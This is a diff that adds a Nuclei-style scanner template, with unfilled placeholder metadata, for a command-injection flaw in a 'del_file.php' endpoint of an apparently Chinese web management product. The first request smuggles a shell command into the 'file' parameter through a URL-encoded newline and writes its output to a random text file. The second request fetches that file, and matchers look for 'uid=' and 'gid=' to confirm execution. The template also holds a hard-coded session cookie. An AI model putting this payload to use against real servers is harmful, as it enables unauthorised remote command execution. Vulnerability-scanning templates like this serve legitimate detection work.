@@ -1,0 +1,45 @@
+id: dxwg-del_file-rce
+info:
+  name: Template Name
+  author: apple
+  severity: critical
+  description: description
+  reference:
+    - https://
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}" 
+http:
+  - raw:
+      - |+
+        GET /manager/newtpl/del_file.php?file=1.txt%0Aid+%3E+{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: PHPSESSID=7m5fv9uss68b0c10u13vsr53r0
+        Connection: keep-alive
+
+      - |+
+        GET /manager/newtpl/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: PHPSESSID=7m5fv9uss68b0c10u13vsr53r0
+        Connection: keep-alive
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - gid=
+      - type: word
+        part: body
+        words:
+          - uid=
